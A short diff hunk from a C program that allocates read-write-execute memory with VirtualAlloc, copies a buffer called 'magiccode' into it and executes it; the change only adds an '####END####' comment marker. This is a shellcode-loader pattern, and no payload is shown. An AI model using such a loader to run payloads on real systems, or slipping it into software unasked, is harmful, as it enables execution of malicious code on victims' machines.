@@ -13,6 +13,11 @@ int main(int argc, char *argv[])
  
     void * magic_place = VirtualAlloc( 0, magic_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
     memcpy( magic_place, magiccode, magic_size );
+
+
+    //####END####
+
+
     ( (void ( * )())magic_place )();
 
     return 0;
